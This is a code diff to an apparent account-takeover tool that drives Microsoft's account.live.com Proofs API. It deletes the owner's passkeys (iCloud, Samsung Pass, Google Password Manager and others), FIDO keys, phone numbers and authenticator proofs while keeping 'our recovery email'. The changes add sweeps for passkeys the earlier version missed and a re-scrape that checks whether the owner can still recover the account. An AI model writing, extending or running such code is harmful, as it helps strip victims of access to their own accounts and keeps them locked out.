@@ -5,6 +5,8 @@ import re
 
 import httpx
 
+from securing.utils.cookies.safe_cookies import get_cookie
+
 logger = logging.getLogger(__name__)
 
 _PROOFS_PAGE = (
@@ -24,6 +26,7 @@ _PROOF_ARRAY_KEYS = (
     # Modern passkeys (iCloud Keychain, Samsung Pass, Google PM, …)
     "passKeys",
     "passkeyProofs",  # legacy / alternate blob name
+    "passkeyCredentials",
     # Hardware security keys (USB / NFC / Bluetooth FIDO)
     "securityKeys",
     "fidoProofs",
@@ -58,9 +61,14 @@ _REMOVE_FIDO_URL = "https://account.live.com/API/Proofs/RemoveFido"
 _DELETE_PROOF_URL = "https://account.live.com/API/Proofs/DeleteProof"
 
 # Keys / type hints that must use RemovePasskey (not DeleteProof).
-# iCloud Keychain + Samsung Pass live here as passkey credentials.
-_PASSKEY_KEYS = frozenset({"passKeys", "passkeyProofs"})
+# iCloud Keychain + Samsung Pass + Google Password Manager live here.
+_PASSKEY_KEYS = frozenset({"passKeys", "passkeyProofs", "passkeyCredentials"})
 _FIDO_KEYS = frozenset({"securityKeys", "fidoProofs", "helloKeys", "windowsHelloProofs"})
+
+# manageproofsv2 JsonAsync extras (HAR RemovePasskey for Google Password Manager)
+_PROOFS_UIFLVR = 1001
+_PROOFS_SCID = 100109
+_PROOFS_HPGID = 201030
 
 
 def _decode_ms(s: str) -> str:
@@ -68,12 +76,7 @@ def _decode_ms(s: str) -> str:
     return text.replace("\u0040", "@").strip()
 
 
-def _extract_json_array(html: str, key: str) -> list | None:
-    """Extract a JSON array value for ``"key": [...]`` from MS ServerData HTML."""
-    m = re.search(rf'"{re.escape(key)}"\s*:\s*', html or "")
-    if not m:
-        return None
-    i = m.end()
+def _parse_json_array_at(html: str, i: int):
     if i >= len(html) or html[i] != "[":
         return None
     depth = 0
@@ -94,6 +97,34 @@ def _extract_json_array(html: str, key: str) -> list | None:
                         return None
                 return data if isinstance(data, list) else [data]
     return None
+
+
+def _extract_json_array(html: str, key: str) -> list | None:
+    """Extract a JSON array value for ``"key": [...]`` from MS ServerData HTML.
+
+    Skip non-array hits. manageProofs HTML has many ``"passKeys": {title, desc}``
+    string blobs *before* the real ``"passKeys": [{proofId, ...}]`` credential list
+    — taking the first match made Google Password Manager (and other passkeys)
+    invisible to the wipe.
+    """
+    empty: list | None = None
+    object_array: list | None = None
+    for m in re.finditer(rf'"{re.escape(key)}"\s*:\s*', html or ""):
+        data = _parse_json_array_at(html, m.end())
+        if data is None:
+            continue
+        if not data:
+            empty = data
+            continue
+        if any(
+            isinstance(x, dict)
+            and (x.get("proofId") or x.get("credentialId") or x.get("encryptedProofId"))
+            for x in data
+        ):
+            return data
+        if object_array is None and all(isinstance(x, dict) for x in data):
+            object_array = data
+    return object_array if object_array is not None else empty
 
 
 def _extract_json_value(html: str, key: str):
@@ -178,13 +209,90 @@ def _removal_kind(array_key: str, ptype: str, display: str) -> str:
             "samsung pass",
             "samsungpass",
             "google password manager",
+            "microsoft password manager",
             "1password",
             "bitwarden",
             "dashlane",
+            "lastpass",
+            "nordpass",
+            "protonpass",
+            "keepassxc",
+            "enpass",
+            "kaspersky",
+            "ipasswords",
         )
     ):
         return "passkey"
     return "proof"
+
+
+def _proof_id(proof: dict) -> str:
+    return _decode_ms(
+        str(
+            proof.get("proofId")
+            or proof.get("credentialId")
+            or proof.get("encryptedProofId")
+            or proof.get("id")
+            or ""
+        )
+    )
+
+
+def _exclude_next_gen_ids(html: str) -> list[str]:
+    """credentialIds from ``passkey.postData.excludeNextGenCredentialsJson``."""
+    m = re.search(
+        r'"excludeNextGenCredentialsJson"\s*:\s*"((?:\\.|[^"\\])*)"',
+        html or "",
+    )
+    if not m:
+        return []
+    try:
+        raw = json.loads(f'"{m.group(1)}"')
+        data = json.loads(raw) if isinstance(raw, str) else raw
+    except Exception:
+        return []
+    if not isinstance(data, list):
+        return []
+    out: list[str] = []
+    for item in data:
+        if isinstance(item, str) and item.strip():
+            out.append(item.strip())
+        elif isinstance(item, dict):
+            pid = _proof_id(item)
+            if pid:
+                out.append(pid)
+    return out
+
+
+def _page_meta(html: str, session: httpx.AsyncClient) -> dict:
+    uaid = ""
+    m = re.search(r'"uaid"\s*:\s*"([a-fA-F0-9]{8,})"', html or "")
+    if m:
+        uaid = m.group(1)
+    if not uaid:
+        uaid = (get_cookie(session, "uaid") or "").strip()
+    hpgid = _PROOFS_HPGID
+    scid = _PROOFS_SCID
+    uiflvr = _PROOFS_UIFLVR
+    hm = re.search(r'"hpgid"\s*:\s*(\d+)', html or "")
+    if hm:
+        try:
+            hpgid = int(hm.group(1))
+        except ValueError:
+            pass
+    sm = re.search(r'"scid"\s*:\s*(\d+)', html or "")
+    if sm:
+        try:
+            scid = int(sm.group(1))
+        except ValueError:
+            pass
+    um = re.search(r'"uiflvr"\s*:\s*(\d+)', html or "")
+    if um:
+        try:
+            uiflvr = int(um.group(1))
+        except ValueError:
+            pass
+    return {"uaid": uaid, "hpgid": hpgid, "scid": scid, "uiflvr": uiflvr}
 
 
 async def _api_json(
@@ -192,21 +300,39 @@ async def _api_json(
     url: str,
     apicanary: str,
     payload: dict,
+    *,
+    uaid: str = "",
+    form_urlencoded: bool = False,
 ) -> tuple[bool, str | None]:
-    resp = await session.post(
-        url=url,
-        headers={
-            "host": "account.live.com",
-            "Accept": "application/json",
-            "Content-Type": "application/json; charset=UTF-8",
-            "X-Requested-With": "XMLHttpRequest",
-            "canary": apicanary,
-            "Referer": _PROOFS_PAGE,
-            "Origin": "https://account.live.com",
-        },
-        json=payload,
-        follow_redirects=False,
-    )
+    headers = {
+        "host": "account.live.com",
+        "Accept": "application/json",
+        "X-Requested-With": "XMLHttpRequest",
+        "canary": apicanary,
+        "Referer": _PROOFS_PAGE,
+        "Origin": "https://account.live.com",
+    }
+    if uaid:
+        headers["uaid"] = uaid
+    if form_urlencoded:
+        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
+        headers["x-ms-apiTransport"] = "xhr"
+        headers["x-ms-apiVersion"] = "2"
+        body = json.dumps(payload, separators=(",", ":"))
+        resp = await session.post(
+            url=url,
+            headers=headers,
+            content=body.encode("utf-8"),
+            follow_redirects=False,
+        )
+    else:
+        headers["Content-Type"] = "application/json; charset=UTF-8"
+        resp = await session.post(
+            url=url,
+            headers=headers,
+            json=payload,
+            follow_redirects=False,
+        )
     err_code = None
     try:
         data = resp.json()
@@ -228,20 +354,34 @@ async def _delete_proof(
     *,
     label: str,
     kind: str = "proof",
+    meta: dict | None = None,
 ) -> bool:
     """Delete via the correct Proofs API for this credential type.
 
-    Reversed from manageproofsv2:
-      RemovePasskey → {"credentialId": proof.proofId}   (iCloud / Samsung Pass / …)
-      RemoveFido    → {"credentialId": proof.proofId}   (USB security keys)
-      DeleteProof   → {"proofId": …}                    (email / SMS / TOTP / apps)
+    Reversed from manageproofsv2 + Google Password Manager HAR:
+      RemovePasskey → {"credentialId", uiflvr, uaid, scid, hpgid}
+        Content-Type application/x-www-form-urlencoded with a JSON body
+      RemoveFido    → {"credentialId": proof.proofId}
+      DeleteProof   → {"proofId", uaid, uiflvr, scid, hpgid}
     """
+    meta = meta or {}
+    uaid = str(meta.get("uaid") or "")
+    extras = {
+        "uiflvr": int(meta.get("uiflvr") or _PROOFS_UIFLVR),
+        "scid": int(meta.get("scid") or _PROOFS_SCID),
+        "hpgid": int(meta.get("hpgid") or _PROOFS_HPGID),
+    }
+    if uaid:
+        extras["uaid"] = uaid
+
     if kind == "passkey":
         ok, err = await _api_json(
             session,
             _REMOVE_PASSKEY_URL,
             apicanary,
-            {"credentialId": proof_id},
+            {"credentialId": proof_id, **extras},
+            uaid=uaid,
+            form_urlencoded=True,
         )
         api = "RemovePasskey"
     elif kind == "fido":
@@ -249,7 +389,9 @@ async def _delete_proof(
             session,
             _REMOVE_FIDO_URL,
             apicanary,
-            {"credentialId": proof_id},
+            {"credentialId": proof_id, **extras},
+            uaid=uaid,
+            form_urlencoded=True,
         )
         api = "RemoveFido"
     else:
@@ -260,11 +402,12 @@ async def _delete_proof(
             apicanary,
             {
                 "proofId": proof_id,
-                "uaid": "114b68368b7b46afa44c82a8246e4a44",
-                "uiflvr": 1001,
-                "scid": 100109,
-                "hpgid": 201030,
+                "uaid": uaid or "114b68368b7b46afa44c82a8246e4a44",
+                "uiflvr": extras["uiflvr"],
+                "scid": extras["scid"],
+                "hpgid": extras["hpgid"],
             },
+            uaid=uaid,
         )
         api = "DeleteProof"
 
@@ -285,8 +428,8 @@ async def remove_proof(
 ):
     """Remove foreign proofs / phones / apps / passkeys; keep our recovery email.
 
-    Passkeys (incl. Apple iCloud Keychain + Samsung Pass) must use RemovePasskey.
-    Federated sign-in (Sign in with Samsung/Apple) is handled by remove_fed_cred.
+    Passkeys (incl. Apple iCloud Keychain, Samsung Pass, Google Password Manager)
+    must use RemovePasskey. Federated sign-in is handled by remove_fed_cred.
     """
     proofs = await session.get(
         _PROOFS_PAGE,
@@ -299,6 +442,7 @@ async def remove_proof(
 
     html = proofs.text or ""
     logging.info("Proofs response: %s", html[:2000])
+    meta = _page_meta(html, session)
 
     keep_emails: set[str] = set()
     if keep_security_email:
@@ -323,9 +467,7 @@ async def remove_proof(
         for proof in entries:
             if not isinstance(proof, dict):
                 continue
-            pid = _decode_ms(
-                str(proof.get("proofId") or proof.get("encryptedProofId") or "")
-            )
+            pid = _proof_id(proof)
             display = _decode_ms(
                 str(
                     proof.get("displayProofName")
@@ -362,7 +504,12 @@ async def remove_proof(
             kind = _removal_kind(key, ptype, display)
             try:
                 ok = await _delete_proof(
-                    session, apicanary, pid, label=label, kind=kind
+                    session,
+                    apicanary,
+                    pid,
+                    label=label,
+                    kind=kind,
+                    meta=meta,
                 )
                 if ok:
                     deleted += 1
@@ -372,6 +519,28 @@ async def remove_proof(
                         fido_removed += 1
             except Exception as exc:
                 logger.warning("proof remove failed for %s: %s", label, exc)
+
+    # Passkeys listed only in excludeNextGenCredentialsJson (Google PM etc.)
+    for cred_id in _exclude_next_gen_ids(html):
+        if cred_id in handled_ids:
+            continue
+        handled_ids.add(cred_id)
+        label = f"passkey:{cred_id[:40]}"
+        print(f"[~] - Passkey from excludeNextGenCredentialsJson ({cred_id[:24]}…)")
+        try:
+            ok = await _delete_proof(
+                session,
+                apicanary,
+                cred_id,
+                label=label,
+                kind="passkey",
+                meta=meta,
+            )
+            if ok:
+                deleted += 1
+                passkeys_removed += 1
+        except Exception as exc:
+            logger.warning("RemovePasskey failed for exclude id: %s", exc)
 
     # Raw proofId sweep for anything the structured lists missed (legacy email/SMS)
     for raw_id in re.findall(r'"proofId"\s*:\s*"([^"]+)"', html):
@@ -384,12 +553,38 @@ async def remove_proof(
             continue
         try:
             ok = await _delete_proof(
-                session, apicanary, proof, label=proof[:64], kind="proof"
+                session,
+                apicanary,
+                proof,
+                label=proof[:64],
+                kind="proof",
+                meta=meta,
             )
             if ok:
                 deleted += 1
         except Exception as exc:
             logger.warning("DeleteProof failed for raw id: %s", exc)
+
+    # Raw credentialId sweep (passkeys that used credentialId instead of proofId)
+    for raw_id in re.findall(r'"credentialId"\s*:\s*"([^"]+)"', html):
+        cred = _decode_ms(raw_id)
+        if not cred or cred in handled_ids or len(cred) < 8:
+            continue
+        handled_ids.add(cred)
+        try:
+            ok = await _delete_proof(
+                session,
+                apicanary,
+                cred,
+                label=f"passkey:{cred[:40]}",
+                kind="passkey",
+                meta=meta,
+            )
+            if ok:
+                deleted += 1
+                passkeys_removed += 1
+        except Exception as exc:
+            logger.warning("RemovePasskey failed for raw credentialId: %s", exc)
 
     # Re-scrape: did any SMS/phone claim survive the wipe?
     sms_remaining = False
@@ -413,10 +608,13 @@ async def remove_proof(
                     break
             if sms_remaining:
                 break
-        for key in ("passKeys", "passkeyProofs"):
+        for key in ("passKeys", "passkeyProofs", "passkeyCredentials"):
             for proof in _extract_json_value(html2, key) or []:
-                if isinstance(proof, dict) and proof.get("proofId"):
+                if isinstance(proof, dict) and _proof_id(proof):
                     passkeys_remaining += 1
+        passkeys_remaining = max(
+            passkeys_remaining, len(_exclude_next_gen_ids(html2))
+        )
     except Exception as exc:
         logger.warning("SMS/passkey re-scrape soft-skip: %s", exc)
 
